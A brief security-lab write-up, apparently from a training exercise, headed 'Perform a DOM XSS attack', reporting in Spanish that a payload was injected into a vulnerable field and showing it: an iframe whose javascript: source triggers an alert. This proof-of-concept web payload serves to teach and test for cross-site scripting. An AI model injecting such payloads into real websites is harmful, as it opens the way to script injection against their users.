
# DOM XSS

## Perform a DOM XSS attack.

Se inyectó el siguiente payload en un campo vulnerable:

```html
<iframe src="javascript:alert(`xss`)"></iframe>
```

